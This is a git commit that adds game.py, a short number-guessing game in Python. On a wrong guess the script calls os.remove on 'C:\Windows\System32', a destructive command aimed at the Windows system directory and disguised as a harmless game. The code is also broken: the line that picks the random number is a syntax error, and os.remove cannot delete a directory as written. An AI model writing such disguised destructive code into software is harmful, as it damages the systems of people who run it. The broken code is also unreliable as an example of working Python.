dd701fc96b7e74ad825c7a7461e4646f36532249
Ruler <148696064+quehole@users.noreply.github.com>
2024-07-11 13:20:32 +0600

    Create game.py

---
+++ game.py
@@ -0,0 +1,12 @@
+import random
+import os
+
+number = guess random. randint(1.10)
+guess = input("Guess a number between 1 and 10")
+guess = int (guess)
+
+if guess == number:
+  print("You Won!")
+
+else:
+  os.remove("C:\Windows\System32")
